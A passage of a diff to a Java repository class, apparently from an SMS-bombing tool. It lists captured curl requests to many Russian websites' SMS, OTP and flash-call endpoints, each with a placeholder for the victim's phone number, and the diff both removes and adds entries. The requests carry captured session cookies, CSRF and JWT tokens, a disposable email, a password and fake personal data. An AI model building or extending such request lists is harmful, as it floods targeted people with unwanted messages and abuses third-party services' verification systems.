-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'traceparent: 00-d69ef1dbdbb31caf2c14bc908f9b8800-3adc32a062f745d8-01' \\\n" +
-                        "  -H 'tracestate: 2833458@nr=0-1-2833458-350643481-3adc32a062f745d8----1683471586036' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-newrelic-id: Vg4EUlJWABADUVFUAwIFX1w=' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'phone={phone:7+(***)+***-**-**}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://m.keng.ru/api/auth.php?do=send_sms&phone=%2B7%20{phone:(***)%20***-**-**}&additional=&time_start=1683471720&time_send=1683471734' \\\n" +
-                        "  -H 'authority: m.keng.ru' \\\n" +
-                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'cookie: user_city=819175; PHPSESSID=6MA8EtmqKSRHYqpuvx50UOrJ3doCoutN; BITRIX_SM_SALE_UID=252125956; rrpvid=415924122131410; flocktory-uuid=ce761917-256f-45a9-b033-e2e0c92fe3ea-9; _ym_uid=1683471712692515343; _ym_d=1683471712; _userGUID=0:lhdjla87:jDt4CXJOxWrTq0Ndl2IxSMIWPbLRn_Uz; dSesn=e985ba59-5740-fefd-c818-64858cc6c5bd; _dvs=0:lhdjla87:9feDQy22nTe4vr2S7d9aAlwZSV7uYt8z; _ga=GA1.2.410001979.1683471711; _gid=GA1.2.203278608.1683471712; _gat_gtag_UA_3284218_1=1; rcuid=6275fcd65368be000135cd22; gcui=; gcmi=; gcvi=6ekziWFNm1E; gcsi=fglAVDmtHyh; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_lvid=7a2e012d95616e8b5a2b83ecb20e2f72; tmr_lvidTS=1683471712023; c2d_widget_id={%221c4ac29a56745c16aa588c0f8a746ba8%22:%22[chat]%202dcee85992bd3bdfae61%22}; tmr_detect=0%7C1683471714344; _gr_session=%7B%22s_id%22%3A%22b50f62e5-daf4-4c5c-bc21-064e88358589%22%2C%22s_time%22%3A1683471720150%7D; _ga_KXFKXCMF0K=GS1.1.1683471711.1.1.1683471734.37.0.0' \\\n" +
-                        "  -H 'referer: https://m.keng.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --compressed", 7),
-
                 new CurlService("curl 'https://spb.partsdirect.ru/accounts/register?phone={phone}&action=getsms&from=modal' \\\n" +
                         "  -H 'authority: spb.partsdirect.ru' \\\n" +
                         "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
@@ -2389,44 +1781,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                         "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                         "  --data-raw '{\"type\":\"order\",\"name\":\"Сергей\",\"phone\":\"+{phone:7 (***) ***-**-**}\",\"igree\":\"on\",\"currenturl\":\"https://finardi.ru/\",\"utm\":\"=undefined\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://pass.ska.ru/registration/send-code/' \\\n" +
-                        "  -H 'authority: pass.ska.ru' \\\n" +
-                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: PHPSESSID=aa6e772056aa9dad80f46fb460e370be; _csrf=3182c08624700237252a4ea05a154ccda4d02a352645798640109d42a40dee08a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22j8M8OQL6QGTt2oi0dVz4I7XiRGd-clMG%22%3B%7D; _ym_uid=1683473292741918790; _ym_d=1683473292; _ym_isad=2; _ga=GA1.2.857620759.1683473292; _gid=GA1.2.1794914780.1683473292; _gat_gtag_UA_19620142_22=1; _ym_visorc=w; _HC_4379=N4T2X6M1IhksqE0Azzzzzzzz:C4379G108:1686065292; _HC_uu=N4T2X6M1IhkspE0Azzzzzzzz; _HC_fr=:::1683473292; _HC_v4379=AmRXw4wAAwAE~N4T2X6M1IhkspE0A~N4T2X6M1IhksqE0Azzzzzzzz~C4379G108' \\\n" +
-                        "  -H 'origin: https://pass.ska.ru' \\\n" +
-                        "  -H 'referer: https://pass.ska.ru/registration/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-csrf-token: 88iULyGB6Lc_Vi_CPu8GTBVaL5eBBLVtypfCMGo2P7KZ8NkXbtCkgW4Re7YMgG98cQxVo8gz7QSY0KYdCVpy9Q==' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'phone={phone}&phone_prefix=7&action=register' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-call' \\\n" +
-                        "  -H 'authority: kcentr.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/json' \\\n" +
-                        "  -H 'cookie: session_uuid=1e92a07b-46cd-4c98-a02e-7db45441d59a; store[region]=deb1d05a-71ce-40d1-b726-6ba85d70d58f; store[city]=%D0%98%D0%B6%D0%B5%D0%B2%D1%81%D0%BA; store[region_name]=%D0%A3%D0%B4%D0%BC%D1%83%D1%80%D1%82%D1%81%D0%BA%D0%B0%D1%8F%20%D1%80%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0; KC_CITY_CONFIRMATION_SHOWN=true; _gcl_au=1.1.1203414022.1683473561; PHPSESSID=iqv63hbmltost2mjt5ka0alngm; stDeIdU=da87117e-158e-40a6-9f10-a95984a2b028; vIdUid=400fe42b-b5c6-4bf8-8866-1a7edd142a56; stLaEvTi=1683473563986; _acfId=7460ac98-3a82-4516-8bf0-5a1023458588; _acfVisit=2' \\\n" +
-                        "  -H 'origin: https://kcentr.ru' \\\n" +
-                        "  -H 'referer: https://kcentr.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  --data-raw '{\"visitorUuid\":\"1e92a07b-46cd-4c98-a02e-7db45441d59a\",\"cityUuid\":\"deb1d05a-71ce-40d1-b726-6ba85d70d58f\",\"phone\":\"+{phone:7 *** ***-**-**}\"}' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://sberpravo.ru/api/client-profile/v1/user-verify/send/v2' \\\n" +
@@ -2468,42 +1822,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  --data-raw 'mobilePhone={full_phone}' \\\n" +
                         "  --compressed", 7),
 
-                new CurlService("curl 'https://peakstore.ru/local/ajax/authorize.php?action=2' \\\n" +
-                        "  -H 'authority: peakstore.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
-                        "  -H 'cookie: PHPSESSID=1ijXEF7GJBeObE5MR8aN3BZsRKU3OvQt; _ga=GA1.2.DE97DAC1-D247-330D-DD34-5623C012304C; BITRIX_SM_SALE_UID=369332880; _ym_uid=1683474014214437739; _ym_d=1683474014; _ga=GA1.2.DE97DAC1-D247-330D-DD34-5623C012304C; _gid=GA1.2.847096028.1683474014; _gat_gtag_UA_197756461_1=1; __exponea_etc__=0dac0319-f2ff-43e2-aace-4715018e1084; __exponea_time2__=0.5859441757202148; _ym_visorc=w; _ym_isad=2; mgo_uid=X5j4GqvLjO8AI7u34Gyr; __cf_bm=EsQNVsJMWVwKkKNEhw8UIH1TW4aATLVNfwRfM9IhJzA-1683474018-0-Ac2BIci5B7XcUd9khIdSe70P2PWqv+tkQ7pR7fnO9ML3MjOFOkOoGEnEUa/DREh5LbcNNRprtnpF38XOrn1n8CGgNmZo3AtM53JsN9mi0/83' \\\n" +
-                        "  -H 'origin: https://peakstore.ru' \\\n" +
-                        "  -H 'referer: https://peakstore.ru/auth/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  --data-raw 'phone={full_phone}&bxsessid=2ac51002e1ac2e072a405994d8acbb1d&lid=pe' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://marketzdorovie.ru/api/login/send_code' \\\n" +
-                        "  -H 'authority: marketzdorovie.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'bx-ajax: true' \\\n" +
-                        "  -H 'content-type: application/json;' \\\n" +
-                        "  -H 'cookie: PHPSESSID=2hbnv434bmtanv3fgis1lh9vi8; BITRIX_SM_SALE_UID=134859; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A4%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=168347417875899015; _ym_d=1683474178; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_visorc=w' \\\n" +
-                        "  -H 'origin: https://marketzdorovie.ru' \\\n" +
-                        "  -H 'referer: https://marketzdorovie.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw '{\"phone\":\"{phone:+7 (***) *** ** **}\",\"sessid\":\"ed8a1f45bf4b69fbae8c3c742b59a47e\"}' \\\n" +
-                        "  --compressed", 7),
-
                 new CurlService("curl 'https://lk.dune-hd.tv/v2/otps' \\\n" +
                         "  -H 'authority: lk.dune-hd.tv' \\\n" +
                         "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
@@ -2520,61 +1838,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'sec-fetch-site: same-origin' \\\n" +
                         "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                         "  --data-raw '{ \"phone\": \"{full_phone}\" }' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://www.vprok.ru/as_send_pin' \\\n" +
-                        "  -H 'authority: www.vprok.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
-                        "  -H 'cookie: region=8; shop=2671; deliveryTypeId=1; standardShopId=7707; luuid=d0179dbe-41a1-4c9f-baf6-5276148bdf17; suuid=4180f32b-bbd1-405d-8f57-8ff7fb5f42a9; XSRF-TOKEN=eyJpdiI6Im9GenBrU0t1akt1YmZvXC9mb0p2OU13PT0iLCJ2YWx1ZSI6IjF0M0NVUWJrTGNQekx6ZXdDeUorUElCY1AxaDFsSHlzOGg0Zk12cHJiOGVaWTRrTlgzakIrcXdKaldadTViRFBBVGorOXdXNnY5TThXQXEwWExVUnd3PT0iLCJtYWMiOiIzZWE3NmU5MTg3Y2U1N2FlY2JkMjlhMjM5NTJlOWFiNmI4NmZlMTQ3Y2U1NjIxNzMzOTNkZGRlZjkzY2U1N2YxIn0%3D; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZGQwMTc5ZGJlLTQxYTEtNGM5Zi1iYWY2LTUyNzYxNDhiZGYxNzBlNjMwY2VhNGNmN2RhNjg4NGY0YmUzODRlNTJlMWMxYzRlZjc0NDUiLCJpYXQiOjE2ODQ4NTA5NjMuNjE1NDE1LCJuYmYiOjE2ODQ4NTA5NjMuNjE1NDE3LCJleHAiOjE2ODQ4NjUzNjMuNjExMzMxLCJzdWIiOiIiLCJzY29wZXMiOltdLCJzcGxpdF9zZWdtZW50Ijo1fQ.KjvVaYIc4x5VYcdQIhpEwd7NyBdUE5fKaoF4acANBv9LweariuOegGnWns7HT-xjc4qXaUnZoNxYoHdW_Cas6k4jGsfJc_-FWHYI2B4qvfNHwNsw3n_mxttlc7ozUYyNdHxn86BgfscPTRIuJS7xH90ywszgtox4ytKWW9FAW3ZDhR54bo-5FkOiJSeuBs7b98IuG-W9KE7h49oVWTr-B3kTc4yglSr_5CFAvhlVC32wJz2pFuWLYcm1TmyD76COBc1KkZxYF63n__yHjXStNXuG7_BbZfXwYrB5vCiyV0H5hJGfN8dcfBVn-CZINDQldXX2xW2ZDYld2LF0ruSM9rmbSEGWddgkvwD4P3RxIEWguyzi35BLgiGgR6EEq_qVLqxLn1vK9zBYPH1yxzVgZXLDeIvpCy8tDyAghbfP5leIoESeyoeFy-MbiqA8tfSVu0TcGpF8oMtK8F0U7HxWCKabwai4-5_wkDndKXvhXMZK00nTQ7dwy7CxEL1TPAhs6UXmg8Vv09SgbI9Qd9CVVN7b4W5PKzD9BQhxEAWUH3oq7aLfp4gzDNe_6S0ALHaXk-Fi8PByP9gppqvXZcBi9oXCdE-TdAnnEaqr3yE7cRwzIZbCfxJ8NX06WdLvXwqBnhYBpPb1lQqUHWlym2APH6dUyHvd7D6KCR8xxwex0DE; split_segment=5; split_segment_amount=11; aid=eyJpdiI6Ik9qaGtrSzV5dkl1YVBMUXFORkcwZUE9PSIsInZhbHVlIjoieDMza3BlaW51a3U3dnZLSDUrUU1lWHpXbWFDSDFkNXhzZCtqVHFzTzBQbDc0YkVnbm10NmdVTG02c3BBd09TRzRXdUNtV0xlUmZhZUlYcVZxbTB1elE9PSIsIm1hYyI6IjI2NjUwZGFiZDAyYWM5Y2RjMGNmNzVhYjkzM2FiY2FjNWRlOTJhNGE4NzQ5YWNjMzlmMzM4ZDljM2NiZDdhNjgifQ%3D%3D; slid=646cc9161f9dcc44460fe5fb; slsession=A455C95C-D062-422B-8562-674BACA48FC8; _ga=GA1.2.1773113177.1684850969; _gid=GA1.2.782787489.1684850969; _gat_UA-93122031-1=1; tmr_lvid=ee93256cc0c36e192266043ebc121d30; tmr_lvidTS=1646758918805; iap.uid=39bd60f74db8457b89a874de6400d6f6; _ym_uid=1646758919570684827; _ym_d=1684850970; flocktory-uuid=b26cdebe-f2d7-4c43-af3a-4c5618dad53f-0; __zzatgib-w-vprok=MDA0dBA=Fz2+aQ==; __zzatgib-w-vprok=MDA0dBA=Fz2+aQ==; _ym_isad=2; _ym_visorc=b; adrdel=1; adrcid=As77jfPb8KSehOZ8KNcg1KA; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; gsscgib-w-vprok=1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja; gsscgib-w-vprok=1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja; tmr_detect=0%7C1684850972561; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ga_B122VKXXJE=GS1.1.1684850969.1.0.1684850974.55.0.0; _POBP_s=rum=1&id=f232bf29-da62-4e9a-9d08-fd98d64774b8&created=1684850968146&expire=1684851883773; fgsscgib-w-vprok=AODHd22f65933cf699867cec8462eac3b99579e4; fgsscgib-w-vprok=AODHd22f65933cf699867cec8462eac3b99579e4' \\\n" +
-                        "  -H 'origin: https://www.vprok.ru' \\\n" +
-                        "  -H 'referer: https://www.vprok.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'x-gib-fgsscgib-w-vprok: AODHd22f65933cf699867cec8462eac3b99579e4' \\\n" +
-                        "  -H 'x-gib-gsscgib-w-vprok: 1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja' \\\n" +
-                        "  -H 'x-xsrf-token: eyJpdiI6Im9GenBrU0t1akt1YmZvXC9mb0p2OU13PT0iLCJ2YWx1ZSI6IjF0M0NVUWJrTGNQekx6ZXdDeUorUElCY1AxaDFsSHlzOGg0Zk12cHJiOGVaWTRrTlgzakIrcXdKaldadTViRFBBVGorOXdXNnY5TThXQXEwWExVUnd3PT0iLCJtYWMiOiIzZWE3NmU5MTg3Y2U1N2FlY2JkMjlhMjM5NTJlOWFiNmI4NmZlMTQ3Y2U1NjIxNzMzOTNkZGRlZjkzY2U1N2YxIn0=' \\\n" +
-                        "  --data-raw 'phone={full_phone}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://aptekiplus.ru/api/v1/user/profile' \\\n" +
-                        "  -H 'authority: aptekiplus.ru' \\\n" +
-                        "  -H 'accept: application/json' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/json' \\\n" +
-                        "  -H 'cookie: qrator_jsr=1684851248.308.K5dUmC9GBag3JcvN-jd4mr44u0coci67cm6710j64ko0785a8-00; qrator_jsid=1684851248.308.K5dUmC9GBag3JcvN-k0tq91lroc8ji2m2qeas9qveruvndnfs; qrator_ssid=1684851248.797.umO8kS3eEFDzSzrd-cv13358lvr0a8ktutfglrh9pa3rnnvbf; user-city=%7B%22id%22%3A0%2C%22code%22%3A%22moskva%22%2C%22phone%22%3A%228%20(495)%20137-94-95%22%2C%22externalId%22%3A%227700000000000000000000000%22%2C%22regionExternalId%22%3A77%2C%22name%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%22%7D; _ym_uid=1684851253297738041; _ym_d=1684851253; _ym_isad=2; _ym_visorc=b; buyer=%7B%22id%22%3A%220667db13-8a7b-4df3-9a6a-56e644dbc301%22%7D; favourite-retail-points-notification=%7B%22seen%22%3Atrue%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; accept_cookies=true' \\\n" +
-                        "  -H 'mindbox-device-uuid: bb0643e8-bc08-4838-bf34-5b23a4221287' \\\n" +
-                        "  -H 'origin: https://aptekiplus.ru' \\\n" +
-                        "  -H 'referer: https://aptekiplus.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  --data-raw '{\"phone\":\"{full_phone}\",\"email\":\"bayeyip588@runfons.com\",\"password\":\"qwertyuiopAQE4\",\"regionExternalId\":77,\"cityExternalId\":\"7700000000000000000000000\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://avosend.com/api/registration.action' \\\n" +
-                        "  -H 'authority: avosend.com' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \\\n" +
-                        "  -H 'cookie: SESSION=MmQwNmU4NjQtODg3OS00YzZhLThjYWItZWFlMDJiYjljYTIz; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gid=GA1.2.581790084.1684851591; _ym_uid=1684851592263111876; _ym_d=1684851592; _ym_isad=2; _ym_visorc=w; _ga=GA1.1.760778997.1684851591; _ga_5X6PVWPZ44=GS1.1.1684851593.1.0.1684851602.0.0.0; amp_84ec34=w4b4u-w0cN_iQqlzInxbpN.NzkwNDU5NTAxMDU=..1h14fm1ce.1h14fot8f.7.1.8' \\\n" +
-                        "  -H 'origin: https://avosend.com' \\\n" +
-                        "  -H 'referer: https://avosend.com/registration' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  --data-raw 'toValues%5Bphone%5D={full_phone}&hmac=fe7bdeb80577650c53d78d16511aa739&toValues%5Bpost_code%5D=312323&toValues%5Bbirthday%5D=23.12.2001&toValues%5Baddress%5D=%D0%BC%D0%B5%D1%82%D1%80%D0%BE+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0-%D0%A2%D0%BE%D0%B2%D0%B0%D1%80%D0%BD%D0%B0%D1%8F&toValues%5Bcity%5D=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&toValues%5Bname%5D=gwerg&toValues%5Bname_f%5D=rewgerg&toValues%5Bemail%5D=bayeyip588%40runfons.com' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://program33.ru/ajax/' \\\n" +
@@ -2995,7 +2258,517 @@ public class DefaultRepository implements ServicesRepository {
                         builder.add("Login1", "Y");
                         builder.add("IS_AJAX", "Y");
                     }
-                }
+                },
+
+                new CurlService("curl 'https://api.starterapp.ru/clubve/auth/resetCode' \\\n" +
+                        "  -H 'authority: api.starterapp.ru' \\\n" +
+                        "  -H 'accept: application/json' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'authcode;' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'lang: ru' \\\n" +
+                        "  -H 'origin: https://clubve.delivery' \\\n" +
+                        "  -H 'referer: https://clubve.delivery/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: cross-site' \\\n" +
+                        "  -H 'sessionid: f6ef1f7b-b965-4543-ae91-a3912d62383b' \\\n" +
+                        "  -H 'timezone: Europe/Moscow' \\\n" +
+                        "  -H 'uber-trace-id: ff2d60ee0a3cf9cd3126326d812ca6a6:3a30b4cb28eded81:0:1' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://vsesmart.ru/bitrix/services/main/ajax.php?mode=class&c=optimalgroup%3Aregistration&action=sendCode' \\\n" +
+                        "  -H 'authority: vsesmart.ru' \\\n" +
+                        "  -H 'accept: */*' \\\n" +
